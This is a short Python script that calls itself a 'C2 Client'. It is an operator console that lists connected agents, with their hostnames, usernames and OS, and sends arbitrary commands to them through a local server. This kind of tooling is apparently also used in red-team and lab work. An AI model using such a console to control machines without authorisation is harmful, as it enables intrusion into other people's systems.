import requests
import json
import sys
import time

SERVER_URL = "http://localhost:5050"

def print_agents():
    response = requests.get(f"{SERVER_URL}/agents")
    agents = response.json().get('agents', [])
    
    if not agents:
        print("No agents connected")
        return
    
    print("\nConnected Agents:")
    print("=================")
    for agent in agents:
        print(f"ID: {agent['id']}")
        print(f"  Hostname: {agent['hostname']}")
        print(f"  Username: {agent['username']}")
        print(f"  OS: {agent['os']}")
        print(f"  Last Seen: {agent['last_seen']}")
        print()

def send_command(agent_id, command):
    data = {
        'id': agent_id,
        'command': command
    }
    response = requests.post(f"{SERVER_URL}/command", json=data)
    if response.json().get('status') == 'success':
        print(f"Command sent to agent {agent_id}")
    else:
        print(f"Error sending command: {response.json().get('message')}")

def main_loop():
    print("C2 Client")
    print("=========")
    
    while True:
        print("\nOptions:")
        print("1. List agents")
        print("2. Send command")
        print("3. Exit")
        
        choice = input("\nEnter choice: ")
        
        if choice == '1':
            print_agents()
        elif choice == '2':
            print_agents()
            agent_id = input("Enter agent ID: ")
            command = input("Enter command: ")
            send_command(agent_id, command)
        elif choice == '3':
            print("Exiting...")
            sys.exit(0)
        else:
            print("Invalid choice")
        
        time.sleep(1)

if __name__ == "__main__":
    main_loop()
